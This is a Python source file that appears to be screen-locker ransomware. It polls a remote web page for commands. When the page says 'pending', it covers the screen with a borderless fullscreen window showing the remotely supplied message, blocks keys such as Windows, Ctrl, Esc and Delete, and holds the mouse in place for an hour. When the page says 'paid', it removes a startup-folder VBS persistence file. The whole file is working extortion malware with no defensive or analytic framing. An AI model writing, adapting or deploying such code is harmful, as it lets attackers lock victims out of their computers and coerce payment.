import os
import time
import requests
from bs4 import BeautifulSoup
import pyautogui
import getpass
import keyboard
import threading

# Define the delay between each execution (in seconds)
delay = 1

url = 'https://tanjim750.github.io/remotecontrol/'  # Replace with the URL of your website
loop = True
try:
    response = requests.get(url)

    soup = BeautifulSoup(response.text, 'html.parser')
    status_input = soup.find('input', {'id': 'status'})  # Find the input element with the ID 'status'
    text_input = soup.find('textarea', {'id': 'text'})  # Find the textarea element with the ID 'text'
    #time.sleep(delay)
    if status_input:
        status_value = status_input.get('value')  # Get the value attribute of the input element
    if text_input:
        text = text_input.text
except:
    status_value = "loop"
    
while loop:
    try:
        response = requests.get(url)

        soup = BeautifulSoup(response.text, 'html.parser')
        status_input = soup.find('input', {'id': 'status'})  # Find the input element with the ID 'status'
        text_input = soup.find('textarea', {'id': 'text'})  # Find the input element with the ID 'status'
        #time.sleep(delay)
        if status_input:
            status_value = status_input.get('value')  # Get the value attribute of the input element
        
        if text_input:
            text = text_input.text
    except:
        pass
    if status_value == "pending":
        pyautogui.FAILSAFE = False
        x, y = pyautogui.position()
        run_time = 3600
        def display_message():
            import tkinter as tk

            keyboard.block_key('windows')  # block the windows key
            keyboard.block_key('enter')  # block the ctrl+alt+delete combination
            keyboard.block_key('esc')  # block the alt+f4 combination
            keyboard.block_key('delete')
            keyboard.block_key('ctrl')

        
            def hide_message():
                message_window.destroy()

            message_window = tk.Tk()
            message_window.attributes('-fullscreen', True)
            message_window.overrideredirect(True)
            message_window.configure(background='white')

            label = tk.Label(message_window, text=text, font=('Arial', 13))
            display_encode = tk.Text(message_window, height="20")
        
            label.pack(expand=True)
            display_encode.pack()
        
            display_encode.insert("end","!JUL!@@!$!@KI@#%%!@$!@FULL@TF@E$#@%!@#!@#%&@!*^!@%@!SNM!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#!@#%&@!*^!@%@!YFT!@@!$!@T!@!$!@T!$@#%%!@$!@!YT@TF@E$#@%!@#")

            message_window.after(1000*run_time, hide_message)
            message_window.mainloop()
        
        def disable_mouse():
            is_true = True
            start_time = time.time()
            while is_true:
                pyautogui.moveTo(x, y)
                end_time = time.time()
                if end_time - start_time > run_time:
                    is_true = False
                else:
                    is_true = True
                
        
        thread1 = threading.Thread(target=display_message)
        thread2 = threading.Thread(target=disable_mouse)

        thread1.start()
        thread2.start()

    elif status_value == "loop":

        # Enable the mouse and keyboard by checking the fail-safe
        pyautogui.FAILSAFE = True

        loop = True
    elif status_value == "donotexecute":

        loop = False
    elif status_value == "paid":

        username = getpass.getuser()
        remove_path = r"C:\Users"+r"/"+username+r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startapp.vbs"
        os.remove(remove_path)
        break
    else:
             
        loop = True
    time.sleep(3)